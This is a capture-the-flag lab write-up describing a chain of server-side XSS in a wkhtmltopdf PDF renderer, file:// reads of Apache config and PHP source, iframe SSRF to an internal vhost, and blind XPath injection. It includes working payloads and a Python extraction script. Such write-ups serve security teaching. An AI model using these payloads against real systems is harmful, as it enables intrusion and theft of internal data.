# XPath Blind Injection — Injectra Skills Assessment

This lab chains four different techniques: wkhtmltopdf server-side XSS → LFI to read application source and Apache config → iframe SSRF to a hidden internal vhost → XPath boolean-blind injection to extract a hidden record.

---

## The Full Chain

```
[/order.php — public shop]
   ↓ title/desc fields → raw HTML in wkhtmltopdf render
   ↓
[Server-Side XSS in PDF renderer]
   ↓ file:// LFI via XMLHttpRequest
   ↓
[Read /etc/apache2/sites-enabled/000-default.conf]
   → Reveals second vhost: 127.0.0.1:8000 with DocumentRoot /var/www/internal
   ↓
[Iframe SSRF to http://127.0.0.1:8000/]
   → "Hardware Order System" with search endpoint ?q=
   ↓
[Read /var/www/internal/index.php via LFI]
   → simplexml_load_file(XMLFILE) + $query = "/orders/order[id=" . $_GET['q'] . "]"
   → Classic XPath injection (raw concat)
   ↓
[XPath boolean-blind via iframe SSRF]
   → Hidden order with non-obvious ID contains flag in description field
```

---

## Step 1 — Confirm Injection Point

The `/order.php` endpoint accepts `id`, `title`, `desc`, `comment` via POST and returns a PDF invoice. The `comment` field is escaped with `htmlentities()` but `title` and `desc` are raw.

Test with `desc=<script>document.body.innerHTML='JS-OK '+window.location</script>`. If the PDF shows the `file:///tmp/...` path, JavaScript is executing.

---

## Step 2 — Read the Apache Config

```html
<script>
var x = new XMLHttpRequest();
x.onload = function() {
    document.body.innerHTML = '<pre>' + this.responseText + '</pre>';
};
x.open("GET", "file:///etc/apache2/sites-enabled/000-default.conf", true);
x.send();
</script>
```

The config will contain something like:
```apache
<VirtualHost 127.0.0.1:8000>
    DocumentRoot /var/www/internal
    ...
</VirtualHost>
```

This tells you the internal app's root path, which is needed for the source LFI.

---

## Step 3 — Read the Internal App Source

```html
<script>
var x = new XMLHttpRequest();
x.onload = function() {
    document.body.innerHTML = '<pre>' + this.responseText + '</pre>';
};
x.open("GET", "file:///var/www/internal/index.php", true);
x.send();
</script>
```

The source reveals:
```php
$xml = simplexml_load_file(getenv()['XMLFILE']);
$query = "/orders/order[id=" . $_GET['q'] . "]";
$results = $xml->xpath($query);
```

Direct string concatenation into an XPath expression. The XML data file location comes from an environment variable, but that doesn't matter — the app reads it and we can query it.

---

## Step 4 — Map the XPath Document Structure

Using iframe SSRF, probe the internal endpoint's behavior:

```html
<!-- No match → "No Results!" text in page -->
<iframe src="http://127.0.0.1:8000/index.php?q=0" width="600" height="400"></iframe>

<!-- Matches order id=1 -->
<iframe src="http://127.0.0.1:8000/index.php?q=1" width="600" height="400"></iframe>

<!-- q=1 or 1=1 → all orders (no brackets needed inside the predicate) -->
<iframe src="http://127.0.0.1:8000/index.php?q=1 or 1=1" width="600" height="400"></iframe>
```

The oracle: if the page text contains `No Results!` → false; otherwise → true.

Boolean probes to understand the schema:
- `q=1 and name(/*)='orders'` → if true, root is `<orders>`
- `q=1 and count(//order)=7` → 7 visible orders
- `q=1 and contains(string(//),'HTB')` → confirms flag is in the document
- `q=1 and count(//order[contains(description,'HTB')])>0` → confirms the flag is in an order's description

---

## Step 5 — Find the Hidden Order ID

The visible orders have IDs 1–6 plus 1337, but none of their descriptions contain the flag. A hidden order with a non-sequential ID exists.

Binary search for the hidden order's numeric ID:

```python
import requests, re

TARGET = "http://TARGET"

def pdf_contains(desc_script):
    # Send the desc field as the XPath-bearing iframe payload
    r = requests.post(f"{TARGET}/order.php", data={
        "id": "1",
        "title": "t",
        "desc": f'<iframe src="http://127.0.0.1:8000/index.php?q={desc_script}" width="600" height="700"></iframe>',
        "comment": "c"
    })
    # Save PDF and extract text
    with open("/tmp/test.pdf", "wb") as f:
        f.write(r.content)
    import subprocess
    out = subprocess.check_output(["pdftotext", "/tmp/test.pdf", "-"]).decode()
    return "No Results" not in out

# Confirm flag in document
print(pdf_contains("1 and contains(string(//),'HTB')"))  # should be True

# Binary search for hidden order ID
lo, hi = 0, 1_000_000
while lo < hi:
    mid = (lo + hi) // 2
    probe = f"1 and number(//order[contains(description,'HTB')]/id)>{mid}"
    if pdf_contains(probe):
        lo = mid + 1
    else:
        hi = mid

print("Hidden order ID:", lo)
```

Once you have the ID:
```html
<iframe src="http://127.0.0.1:8000/index.php?q=<ID>" width="600" height="700"></iframe>
```

The description field of that order contains the flag.

---

## XPath Injection Reference

XPath predicates use `and`, `or`, `not()` — not SQL's `AND`/`OR`. These are the key functions:

| Function | Purpose |
|----------|---------|
| `contains(string, substring)` | Check if a string contains a substring |
| `starts-with(string, prefix)` | Prefix check |
| `string-length(string)` | Get string length |
| `substring(string, start, length)` | Extract substring (1-indexed) |
| `string-to-codepoints()` | In XPath 2.0 only — not always available |
| `number(node)` | Convert to numeric for comparisons |
| `count(nodeset)` | Count matching nodes |
| `name(node)` | Get element name |

For char-by-char blind extraction when `contains()` is too coarse:
```xpath
/orders/order[contains(description,'HTB')]/description[substring(.,1,1)='H']
```

Or via string length:
```xpath
count(//order[string-length(description)=42])>0
```

---

## Pitfalls

**SOP blocks XHR from iframe to different origin.** You can't use JavaScript inside the iframe to exfiltrate data to an external server. All SSRF data extraction must happen through the rendered content visible in the PDF.

**XPath `]` balancing.** Every injection payload must result in a valid XPath expression. `1 or 1=1` works inside `[id=<inject>]` because XPath allows `or` inside a predicate. Bracket-based injections like `1] | //order[1` need the full expression to parse.

**iframe geometry.** wkhtmltopdf's iframe rendering has size limits. If important content is cut off, reduce the font size in the injected page or increase iframe dimensions (up to the wkhtmltopdf limit).

**PDF text extraction.** `pdftotext` sometimes merges columns or loses whitespace. If the flag looks garbled, also try opening the PDF in a viewer or use `pdftohtml` for more faithful extraction.
